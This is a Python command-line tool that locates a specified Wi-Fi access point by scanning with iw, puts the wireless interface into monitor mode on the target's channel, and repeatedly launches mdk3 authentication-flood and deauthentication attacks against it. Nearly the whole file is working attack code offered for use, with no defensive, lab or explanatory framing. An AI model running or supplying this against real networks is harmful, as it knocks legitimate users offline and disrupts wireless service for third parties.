import os
import re
import subprocess
import threading
import time
from typing import Any, List, Literal

import click
from rich.console import Console
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)
from rich.table import Table
from rich.traceback import install

from logger import logger

devnull = open(os.devnull, "wt")

console: Console = Console()

install()


def sleep(seconds: float, /):
    cols = [SpinnerColumn()]

    if _pretty:
        cols = [
            SpinnerColumn(),
            BarColumn(),
            TimeRemainingColumn(),
            TimeElapsedColumn(),
        ]

    with Progress(
        *cols,
        console=console,
        transient=False,
    ) as progress:
        task = progress.add_task("[green]Processing", total=seconds)

        while not progress.finished:
            progress.update(task, advance=0.2)
            time.sleep(0.2)


def mdk3(interface: str, bssid: str) -> None:
    logger.info("Starting the <b>mdk3</b> sub processe(s)...")
    threading.Thread(
        target=subprocess.run,
        args=(
            [
                "sudo",
                "mdk3",
                interface,
                "a",
                "-a",
                bssid,
                "-c",
                "-m",
            ],
        ),
        kwargs={
            "capture_output": True,
            "text": True,
            "check": False,
        },
    ).start()

    threading.Thread(
        target=subprocess.run,
        args=(["sudo", "mdk3", _interface, "d"],),
        kwargs={
            "capture_output": True,
            "text": True,
            "check": False,
        },
    ).start()


def change_interface_status(interface: str, status: Literal["up", "down"]):
    p = subprocess.run(
        ["sudo", "ip", "link", "set", interface, f"{status}"],
        stderr=devnull,
        stdout=devnull,
    )

    return p.returncode


def change_interface_type(interface: str, _type: Literal["managed", "monitor"]):
    change_interface_status(_interface, "down")

    p = subprocess.run(
        ["sudo", "iw", "dev", interface, "set", "type", f"{_type}"],
        stderr=devnull,
        stdout=devnull,
    )

    change_interface_status(_interface, "up")

    return p.returncode


def change_interface_channel(interface: str, channel: int):
    change_interface_status(interface, "up")

    p = subprocess.run(
        [
            "sudo",
            "iw",
            "dev",
            f"{interface}",
            "set",
            "channel",
            f"{channel}",
        ],
    )

    return p.returncode


def play(
    duration: int = 10,
    channel: int = 10,
    file_type: str = "raw",
    rate: int = 2200,
    format: str = "u8",
    file: str = "/dev/random",
):
    threading.Thread(
        target=subprocess.run,
        args=(
            [
                "aplay",
                "--duration",
                f"{duration}",
                "--channels",
                f"{channel}",
                "--file-type",
                f"{file_type}",
                "--rate",
                f"{rate}",
                "--format",
                f"{format}",
                f"{file}",
            ],
        ),
        kwargs={"stdout": devnull, "stderr": devnull},
    ).start()


class Target:
    obj = None

    def __new__(cls, *args, **kwargs):
        if cls.obj is None:
            cls.obj = super().__new__(cls)

        return cls.obj

    def __init__(self, bssid: str) -> None:
        self.bssid = bssid.lower()
        self.channel = None
        self.ssid = None

    def __setattr__(self, name: str, value: Any, /) -> None:
        if hasattr(self, name):
            if name == "ssid" and self.ssid is not None and self.ssid != value:
                play()

            super().__setattr__(name, value)

            if self.bssid and hasattr(self, "ssid") and self.channel:
                logger.success(
                    rf"The target was found <b>{self.bssid!r} ({self.ssid})</b> on <b>{self.channel!r}</b> channel!"
                )

                change_interface_type(_interface, "monitor")
                change_interface_channel(_interface, self.channel)

        return super().__setattr__(name, value)

    def __repr__(self) -> str:
        return f"<Target bssid={self.bssid!r} channel={self.channel!r}>"


def refresh():
    while True:
        logger.info("Killing previous processes...")

        os.system("sudo pkill -9 mdk3 > /dev/null 2>&1; ")

        change_interface_type(_interface, "managed")

        logger.info(f"Scanning...")
        process = subprocess.run(
            ["sudo", "iw", "dev", _interface, "scan"],
            capture_output=True,
            text=True,
            check=False,
        )

        logger.info(f"Extracting the BSSID, SSID and Channel...")
        process = subprocess.run(
            ["egrep", "^BSS|SSID:|signal:|channel:|set: channel"],
            capture_output=True,
            input=process.stdout,
            text=True,
            check=False,
        )

        lst = []

        for a in [
            "\n".join([y.strip() for y in x.strip().split("\n")])
            for x in process.stdout.split("BSS")
            if x
        ]:
            item = []
            if search := re.search("([A-Za-z0-9]{2}:){1,}..", a):
                start, end = search.span()
                item.append(a[start:end])

            vals = []
            if search := re.search("channel:?.[0-9]{1,}", a):
                start, end = search.span()
                vals.append(
                    int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None,
                )

            if search := re.search("SSID:.*", a):
                start, end = search.span()
                vals.append(re.sub("SSID:.", "", a[start:end]))
            else:
                vals.append(None)

            if search := re.search("signal:.*", a):
                start, end = search.span()
                vals.append(re.sub("signal:.", "", a[start:end]))
            else:
                vals.append(None)

            item.append(vals)
            lst.append(item)

        dct = dict(lst)

        if _print_table:
            try:
                table: Table = Table()

                cols: List[str] = ["No", "BSSID", "SSID", "CH", "SIGNAL"]

                for col in cols:
                    table.add_column(col)

                table.header_style = "bold"
                table.border_style = "white"

                for index, (bssid, vals) in enumerate(
                    sorted(
                        dct.items(),
                        key=lambda item: item.__getitem__(-1).__getitem__(-1),
                    )
                ):
                    channel, ssid, signal = vals

                    table.add_row(
                        *map(
                            str,
                            [
                                f"{index + 1}",
                                f"[bold]{bssid.upper()}[/]",
                                ssid,
                                f"[bold cyan]{channel}[/]",
                                f"[bold italic]{signal}[/]",
                            ],
                        )
                    )

                console.print(table)
            except Exception as err:
                console.print(err)

        if Target.obj is not None and (target := dct.get(Target.obj.bssid)):
            channel, ssid, signal = target
            if channel:
                logger.info(f"Update channel to {channel!r}.")

                Target.obj.ssid = ssid
                Target.obj.channel = channel

                mdk3(_interface, Target.obj.bssid)

                logger.info(f"Sleep {_interval} for seconds.")
                sleep(_interval)

        time.sleep(5)


@click.command()
@click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
@click.option("--interval", type=int, default=60)
@click.option("--print-table", is_flag=True, default=False)
@click.option("--pretty", is_flag=True, default=False)
@click.argument("interface")
def main(
    bssid: str,
    interval: int,
    print_table: bool,
    pretty: bool,
    interface: str,
) -> None:
    logger.debug(rf"BSSID: <b>{bssid!r}</b>")
    logger.debug(rf"Interval: <b>{interval!r}</b> seconds")
    logger.debug(rf"Interface: <b>{interface!r}</b>")

    global _interface
    global _interval
    global _print_table
    global _pretty

    _interval = interval
    _interface = interface
    _print_table = print_table
    _pretty = pretty

    threading.Thread(target=refresh).start()

    Target(bssid)


if __name__ == "__main__":
    main()
